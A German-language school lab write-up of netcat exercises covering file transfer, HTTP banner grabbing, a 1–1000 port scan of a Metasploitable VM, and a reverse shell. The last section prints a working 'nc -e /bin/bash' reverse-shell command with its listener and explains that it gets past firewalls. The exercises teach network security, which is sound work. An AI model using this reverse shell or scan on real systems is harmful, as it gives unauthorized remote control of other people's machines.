## Übung (netcat data send)


### Angabe

Übertrage, per netcat, den Inhalt einer lokalen Text-Datei an einen anderen Schüler (auf einem anderen Rechner). Soll am Zielsystem in einer Textdatei gespeichert werden.

### Lösung

Zuerst startet der **Empfänger** netcat im Listen-Modus auf einem bestimmten Port und leitet die eingehenden Daten direkt in eine Datei um:

```bash
nc -l -p 1234 > empfangen.txt
```

Danach verbindet sich der **Sender** mit der IP des Empfängers und piped die lokale Datei als Eingabe:

```bash
nc  1234 < datei.txt
```

Sobald die Datei vollständig übertragen wurde, erkennt netcat das Dateiende (EOF) und beendet die Verbindung automatisch. Die Datei ist dann auf dem Empfänger-PC gespeichert.

Wichtig: Der Empfänger muss **immer zuerst** starten, bevor sich der Sender verbindet.

### Ergebnis

![Textdatei](../Bilder/verbindung%20in%20textdatei.png)

## Übung (netcat banner grabbing II)

### Angabe

Erweitere das Kommando aus der vorhergehenden Übung so, dass die HTTP-Anfrage (Request) nicht über stdin eingegeben werden muss sondern per pipe | an nc übergeben wird.

Hinweis:

Die leere Zeile ist im HTTP Protokoll als die Zeichenfolge CRLF definiert.

CR (Carriage Return): Steuerzeichen mit ASCII-Wert dezimal 13 oder hexadezimal 0x0D – \r in Programmen.
LF (Line Feed): Steuerzeichen mit ASCII-Wert dezimal 10 oder hexadezimal 0x0A – \n in Programmen.
Verwende das Tool printf (statt echo) um \r\n verwenden zu können.


### Lösung


```bash
printf "GET / HTTP/1.1\r\nHost: www.htl-braunau.at\r\n\r\n" | nc www.htl-braunau.at 80
```

**Antwort:**
HTTP/1.1 301 Moved Permanently
Server: nginx
Location: https://htl-braunau.at/

Der Server leitet dauerhaft weiter:
- Von `http://` auf `https://` (HTTPS-Zwang)
- Von `www.htl-braunau.at` auf `htl-braunau.at` (www entfernt)

Hier ist `Server: nginx` sichtbar, da auf `www` kein Fortinet-Proxy aktiv ist.

## Übung (netcat port scanning)

### Angabe
Mit netcat kann man feststellen welche Ports auf einem Zielsystem an einen Dienst gebunden sind, diese Ports werden als offen bezeichnet.

Verwende den Scanning-Modus (-z) mit einer Zeitbegrenzung (-w 1) und gib den Portbereich von 1 bis 1000 an um festzusellen welche Ports in Metasploitable geöffnet sind. Recherchiere welche Dienste sich hinter diesen Ports verbergen.
Verbinde dich mit nc zu offenen Ports (ssh, telnet, ftp). Was kannst du herausfinden (Banner Grabbing)?

#### Lösung 

```bash
nc -zv -w 1 192.168.1.51 1-1000
```

**Parameter erklärt:**
- `-z` → Zero-I/O Modus (nur scannen, keine Daten senden)
- `-v` → Verbose (zeigt offene/geschlossene Ports an)
- `-w 1` → Timeout von 1 Sekunde pro Port
- `1-1000` → Portbereich

## Übung netcat (reverse shell)

### Angabe

Analysiere die Kommandozeile:

nc -e /bin/bash 10.20.30.40 4242

Siehe Reverse Shell Cheat Sheet - ncat.

Starte das passende Gegenstück (Server/Listener) auf einem anderen System.

Recherchiere/Dokumentiere:

Warum nennt man das eine Reverse Shell?
Was ist der Vorteil? In welchem Fall wird, von wem, eine Reverse Shell verwendet?


### Lösung

#### Opfer-Seite 

```
nc -e /bin/bash 10.20.30.40 4242
```

| Teil | Bedeutung |
|------|-----------|
| `nc` | Netcat – überträgt Rohdaten über TCP/UDP |
| `-e /bin/bash` | Verbindet eine Bash-Shell mit dem Netzwerk-Socket |
| `10.20.30.40` | IP des Listeners (Angreifer) |
| `4242` | Ziel-Port |

#### Angreifer-Seite (Listener)
```
nc -lvnp 4242
```

| Flag | Bedeutung |
|------|-----------|
| `-l` | Listen-Modus |
| `-v` | Verbose-Ausgabe |
| `-n` | Kein DNS-Lookup |
| `-p 4242` | Port festlegen |

---

![Reverse Shell](../Bilder/reverse%20shell.png)

#### Was ist eine Reverse Shell?

Normalerweise verbindet sich der Angreifer **zum** Opfer (Bind Shell).  
Bei einer Reverse Shell dreht sich das um – das **Opfer verbindet sich aktiv zum Angreifer**.

Da Firewalls eingehende Verbindungen blockieren, aber ausgehende erlauben,
umgeht die Reverse Shell diese Schutzmaßnahme – der Traffic sieht aus wie
eine normale ausgehende Verbindung vom Opfer-System.
